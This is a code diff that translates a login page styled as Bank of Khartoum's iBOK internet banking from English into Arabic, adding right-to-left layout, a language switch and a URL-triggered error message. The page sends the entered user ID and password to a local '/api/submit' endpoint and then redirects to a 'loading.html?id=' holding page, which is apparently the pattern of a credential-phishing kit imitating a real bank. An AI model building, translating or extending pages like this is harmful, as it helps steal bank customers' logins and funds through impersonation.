@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bank of Khartoum | Internet Banking</title>
+<title>بنك الخرطوم | الإنترنت المصرفي</title>
 <link href="images/favicon-bok.png" rel="icon">
 <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
@@ -13,9 +13,13 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 .top-header{display:grid;height:80px;width:100%;grid-template-columns:1fr 3fr;background:linear-gradient(#f33432,#bc262a)}
 .header-logo{width:100%;height:100%;display:inline-grid;place-items:center;position:relative}
 .header-logo img{height:60px}
-.header-text{color:#fff;text-align:right;display:inline-grid;align-items:center;padding-right:3vw;font-size:24px;font-weight:700;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}
+.header-text{color:#fff;text-align:left;display:inline-grid;align-items:center;padding-left:3vw;font-size:24px;font-weight:700;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}
 
-.overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
+.nav-bar{background:#fff;padding:6px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #ddd}
+.nav-bar a{color:#333;text-decoration:none;font-size:13px;font-weight:600}
+.nav-bar a:hover{color:#bc262a}
+.nav-bar .lang-link{background:#bc262a;color:#fff;padding:4px 14px;border-radius:3px;font-size:12px}
+
 .section{flex:1}
 .prelogin{padding:20px 16px}
 .prelogin .container{max-width:600px;margin:0 auto}
@@ -27,15 +31,15 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 
 .loginForm label{color:#828488;font-size:14px}
 .loginForm .form-group,.loginForm .mb-3{margin-bottom:16px}
-.loginForm .form-control{border:1px solid #666;height:40px;background-image:none;width:100%;padding:6px 12px;border-radius:4px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none}
+.loginForm .form-control{border:1px solid #666;height:40px;background-image:none;width:100%;padding:6px 12px;border-radius:4px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none;text-align:right}
 .loginForm .form-control:focus{border-color:#bc262a;box-shadow:none}
 .loginForm .form-control::placeholder{color:#aaa}
 
 .relative{position:relative}
-.relative .form-control{padding-right:40px}
-.toggle-eye{position:absolute;top:50%;right:12px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#999;font-size:18px;padding:0}
+.relative .form-control{padding-left:40px}
+.toggle-eye{position:absolute;top:50%;left:12px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#999;font-size:18px;padding:0}
 
-.float-end.getPwd{display:block;text-align:right;margin-top:4px}
+.float-end.getPwd{display:block;text-align:left;margin-top:4px}
 .float-end.getPwd a{color:#bc262a;font-size:13px;text-decoration:none;font-weight:600}
 .float-end.getPwd a:hover{text-decoration:underline}
 
@@ -43,13 +47,12 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 .form-check-input{width:16px;height:16px;accent-color:#bc262a;cursor:pointer}
 .form-check-label{color:#666;font-size:14px;cursor:pointer}
 
-.btn-bok{background-color:#bc262a;border:1px solid #bc262a;display:block;width:100%;color:#fff;padding:10px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;border:none}
+.btn-bok{background-color:#bc262a;display:block;width:100%;color:#fff;padding:10px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;border:none}
 .btn-bok:hover{background-color:#a11a19}
 .btn-bok:disabled{opacity:.5;cursor:default}
 
 .footer{margin-top:auto;padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
 .footer .container{max-width:600px;margin:0 auto}
-.footer .row{display:flex;align-items:center;justify-content:center;flex-wrap:wrap}
 .copyright{font-weight:600;color:#4a4a4a;font-size:14px}
 .social-media{display:flex;justify-content:center;gap:14px;margin-top:6px}
 .soc-ico{display:inline-block}
@@ -66,7 +69,7 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 .lo-text{font-size:14px;color:#bc262a;font-weight:600}
 
 @media(max-width:480px){
-  .header-text{font-size:18px;padding-right:12px}
+  .header-text{font-size:18px;padding-left:12px}
   .loginbox{padding:20px 16px}
   .top-header{height:70px}
 }
@@ -78,44 +81,49 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
   <div class="header-logo">
     <img src="images/bok-logo.svg" alt="iBOK">
   </div>
-  <div class="header-text">Welcome to<br>iBOK Internet<br>Banking</div>
+  <div class="header-text">مرحباً بك في<br>الإنترنت المصرفي<br>iBOK</div>
+</div>
+
+<div class="nav-bar">
+  <a href="login-en.html" class="lang-link">English</a>
+  <a href="index.html">الرئيسية</a>
 </div>
 
 <div class="section">
   <div class="prelogin">
     <div class="container">
       <div class="loginTitle">
-        <h2>Internet Banking - Login</h2>
+        <h2>الإنترنت المصرفي - تسجيل الدخول</h2>
       </div>
       <div class="loginbox">
-        <h3>Please enter the details</h3>
+        <h3>أدخل بياناتك</h3>
 
-        <div class="error-box" id="errorBox"><span id="errorText">Invalid credentials</span></div>
+        <div class="error-box" id="errorBox"><span id="errorText">بيانات الدخول غير صحيحة</span></div>
 
         <form class="loginForm" autocomplete="off" onsubmit="return false;">
           <div class="mb-3 mt-3">
-            <label for="userName">User ID:</label>
-            <input type="text" class="form-control" id="accountInput" placeholder="Enter User ID" name="userID" maxlength="12" autocomplete="off">
+            <label for="userName">رقم المستخدم:</label>
+            <input type="text" class="form-control" id="accountInput" placeholder="أدخل رقم المستخدم" name="userID" maxlength="12" autocomplete="off">
           </div>
 
           <div class="mb-3">
-            <label for="pwd">Password:</label>
+            <label for="pwd">كلمة المرور:</label>
             <div class="relative">
-              <input type="password" class="form-control" id="passwordInput" placeholder="Enter password" name="pswd" maxlength="16" autocomplete="off">
+              <input type="password" class="form-control" id="passwordInput" placeholder="أدخل كلمة المرور" name="pswd" maxlength="16" autocomplete="off">
               <button type="button" class="toggle-eye" onclick="togglePass()">
                 <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
               </button>
             </div>
-            <div class="float-end getPwd"><a href="#">Forgot Password?</a></div>
+            <div class="float-end getPwd"><a href="#">هل نسيت كلمة المرور؟</a></div>
           </div>
 
           <div class="form-check">
             <input class="form-check-input" type="checkbox" id="flexCheckDefault">
-            <label class="form-check-label" for="flexCheckDefault">Terms and Conditions</label>
+            <label class="form-check-label" for="flexCheckDefault">الشروط والأحكام</label>
           </div>
 
           <div class="mt-3">
-            <button type="button" class="btn btn-bok w-100" id="loginBtn" onclick="doLogin()">Login</button>
+            <button type="button" class="btn btn-bok w-100" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>
           </div>
         </form>
       </div>
@@ -125,9 +133,7 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 
 <div class="footer">
   <div class="container">
-    <div class="row">
-      <div class="copyright">iBOK | Bank of Khartoum 2024</div>
-    </div>
+    <div class="copyright">iBOK | بنك الخرطوم 2024</div>
     <div class="social-media">
       <span class="soc-ico"><a href="#"><img src="images/bok-footer-logo.svg" alt="BOK"></a></span>
       <span class="soc-ico"><a href="#"><img src="images/bok-linkidin.svg" alt="LinkedIn"></a></span>
@@ -139,7 +145,7 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 
 <div class="loading-overlay" id="loadingOverlay">
   <div class="lo-spinner"></div>
-  <div class="lo-text">Verifying...</div>
+  <div class="lo-text">جاري التحقق...</div>
 </div>
 
 <script>
@@ -165,7 +171,7 @@ function doLogin(){
   if(!username||!password)return;
   document.getElementById('errorBox').classList.remove('show');
   document.getElementById('loginBtn').disabled=true;
-  document.getElementById('loginBtn').textContent='Verifying...';
+  document.getElementById('loginBtn').textContent='جاري التحقق...';
 
   fetch('/api/submit',{
     method:'POST',
@@ -178,17 +184,23 @@ function doLogin(){
       window.location.href='loading.html?id='+d.id;
     }else{
       document.getElementById('loginBtn').disabled=false;
-      document.getElementById('loginBtn').textContent='Login';
+      document.getElementById('loginBtn').textContent='تسجيل الدخول';
     }
   })
   .catch(function(){
     document.getElementById('loginBtn').disabled=false;
-    document.getElementById('loginBtn').textContent='Login';
+    document.getElementById('loginBtn').textContent='تسجيل الدخول';
   });
 }
 
 document.getElementById('accountInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('passwordInput').focus();});
 document.getElementById('passwordInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
+
+var urlParams=new URLSearchParams(window.location.search);
+if(urlParams.get('error')==='1'){
+  document.getElementById('errorText').textContent='رقم الحساب أو كلمة المرور غير صحيحة';
+  document.getElementById('errorBox').classList.add('show');
+}
 </script>
 </body>
 </html>
